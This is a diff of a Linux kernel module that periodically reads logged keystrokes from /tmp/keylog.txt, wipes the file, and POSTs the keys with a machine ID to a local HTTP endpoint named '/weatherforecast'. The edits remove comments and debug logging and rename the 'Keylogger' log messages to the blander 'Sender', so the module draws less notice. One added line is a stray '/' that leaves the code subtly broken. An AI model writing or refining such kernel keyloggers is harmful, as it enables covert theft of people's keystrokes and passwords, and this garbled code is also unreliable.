@@ -8,17 +8,19 @@
 #include <linux/socket.h>
 #include <linux/timer.h>
 #include <linux/workqueue.h>
-#include <net/sock.h>
-#include <linux/inet.h>
 #include <linux/uio.h>
 #include <linux/kfifo.h>
+#include <net/sock.h>
+#include <linux/inet.h>
 
 #include "uniqueIdGenerator.h"
 
 const char *uniqueId;
 #define LOG_FILE_PATH "/tmp/keylog.txt"
-#define TIMER_INTERVAL (5 * HZ) // Interval for the timer (5 seconds)
-#define PORT 5247               // Define the port number
+#define TIMER_INTERVAL (5 * HZ)
+#define PORT 5247
+#define MAX_SEND_SIZE 1024
+#define MAX_DATA_SIZE 512
 
 static DEFINE_SPINLOCK(file_lock); // Spinlock for synchronizing file access
 static struct timer_list my_timer;
@@ -53,13 +55,11 @@ static void send_http_post_work(struct work_struct *work)
     char *response;
     int ret;
 
-    char toSend[512];
-    char time[30];
-    get_current_time(time, sizeof(time));
+    char toSend[MAX_DATA_SIZE];
 
-    snprintf(toSend, 512, "{\"Time\":\"%s\",\"ID\":\"%s\",\"Key\":\"%s\"}", time, uniqueId, data->post_data);
+    snprintf(toSend, MAX_DATA_SIZE, "{\"ID\":\"%s\",\"Key\":\"%s\"}", uniqueId, data->post_data);
 
-    http_request = kzalloc(1024, GFP_KERNEL);
+    http_request = kzalloc(MAX_SEND_SIZE, GFP_KERNEL);
     if (!http_request)
     {
         pr_err("Memory allocation for HTTP request failed\n");
@@ -68,7 +68,7 @@ static void send_http_post_work(struct work_struct *work)
         return;
     }
 
-    snprintf(http_request, 1024,
+    snprintf(http_request, MAX_SEND_SIZE,
              "POST /weatherforecast HTTP/1.1\r\n"
              "Host: localhost:%d\r\n"
              "Content-Type: application/json\r\n"
@@ -111,15 +111,12 @@ static void send_http_post_work(struct work_struct *work)
     if (ret < 0)
         pr_err("Failed to send HTTP request: %d\n", ret);
 
-    response = kzalloc(1024, GFP_KERNEL);
+    response = kzalloc(MAX_SEND_SIZE, GFP_KERNEL);
     if (response)
     {
         vec.iov_base = response;
-        vec.iov_len = 1024;
-        ret = kernel_recvmsg(sock, &msg, &vec, 1, 1024, msg.msg_flags);
-        if (ret >= 0)
-            pr_info("Received response: %s\n", response);
-        kfree(response);
+        vec.iov_len = MAX_SEND_SIZE;
+        ret = kernel_recvmsg(sock, &msg, &vec, 1, MAX_SEND_SIZE, msg.msg_flags);
     }
 
     sock_release(sock);
@@ -131,50 +128,41 @@ static void send_http_post_work(struct work_struct *work)
 static void read_keylog_file(struct work_struct *work)
 {
     struct file *file;
-    char buffer[512]; // Buffer to store file data
-    loff_t pos = 0;   // File read position
+    char buffer[MAX_DATA_SIZE];
+    loff_t pos = 0;
     ssize_t ret;
 
     pr_info("Reading data from file: %s\n", LOG_FILE_PATH);
 
-    // Lock the spinlock to prevent concurrent access
     spin_lock(&file_lock);
 
-    // Open the file in read-only mode
     file = filp_open(LOG_FILE_PATH, O_RDONLY, 0777);
     if (IS_ERR(file))
     {
         pr_err("Failed to open log file for reading. Error: %ld\n", PTR_ERR(file));
-        spin_unlock(&file_lock); // Unlock the spinlock if file open fails
+        spin_unlock(&file_lock);
         return;
     }
-    // Read data from the file and print to logs
+
     ret = kernel_read(file, buffer, sizeof(buffer) - 1, &pos);
     if (ret < 0)
     {
         pr_err("Failed to read from log file. Error: %ld\n", ret);
         filp_close(file, NULL);
-        spin_unlock(&file_lock); // Unlock the spinlock in case of error
-        return;
+        spin_unlock(&file_lock);
+        /
+            return;
     }
-
-    // Null-terminate buffer
     buffer[ret] = '\0';
 
-    // Print the read data to kernel logs
-    pr_info("Data from log file: %s\n", buffer);
-
-    // Close the file
     filp_close(file, NULL);
 
     vfs_truncate(&(file->f_path), 0);
     spin_unlock(&file_lock);
 
-    // Prepare and queue the HTTP POST work
     struct http_work_data *http_data = kmalloc(sizeof(*http_data), GFP_KERNEL);
     if (!http_data)
     {
-        pr_err("Failed to allocate memory for HTTP work data\n");
         spin_unlock(&file_lock);
         return;
     }
@@ -182,7 +170,6 @@ static void read_keylog_file(struct work_struct *work)
     http_data->post_data = kstrdup(buffer, GFP_KERNEL);
     if (!http_data->post_data)
     {
-        pr_err("Failed to allocate memory for post data\n");
         kfree(http_data);
         spin_unlock(&file_lock);
         return;
@@ -190,38 +177,30 @@ static void read_keylog_file(struct work_struct *work)
 
     INIT_WORK(&http_data->work, send_http_post_work);
     queue_work(read_workqueue, &http_data->work);
-
-    // Unlock the spinlock
 }
 
 static void timer_callback(struct timer_list *t)
 {
     struct read_work_data *work_data;
 
-    // Allocate work data
     work_data = kmalloc(sizeof(*work_data), GFP_KERNEL);
     if (!work_data)
     {
-        pr_err("Failed to allocate memory for work data\n");
         mod_timer(&my_timer, jiffies + TIMER_INTERVAL);
         return;
     }
-
-    // Initialize work and queue it
     INIT_WORK(&work_data->work, read_keylog_file);
     queue_work(read_workqueue, &work_data->work);
 
-    // Re-schedule the timer
     mod_timer(&my_timer, jiffies + TIMER_INTERVAL);
 }
 
 static int __init read_keylog_init(void)
 {
 
-    uniqueId = getOrCreateUniqueId(); // Generowanie unikalnego identyfikatora
-    pr_info("Keylogger module loaded: Starting periodic file read\n");
+    uniqueId = getOrCreateUniqueId();
+    pr_info("Sender loaded\n");
 
-    // Create a workqueue
     read_workqueue = create_singlethread_workqueue("read_workqueue");
     if (!read_workqueue)
     {
@@ -246,7 +225,7 @@ static void __exit read_keylog_exit(void)
     // Destroy the workqueue
     destroy_workqueue(read_workqueue);
 
-    pr_info("Keylogger module unloaded\n");
+    pr_info("Sender unloaded\n");
 }
 
 module_init(read_keylog_init);
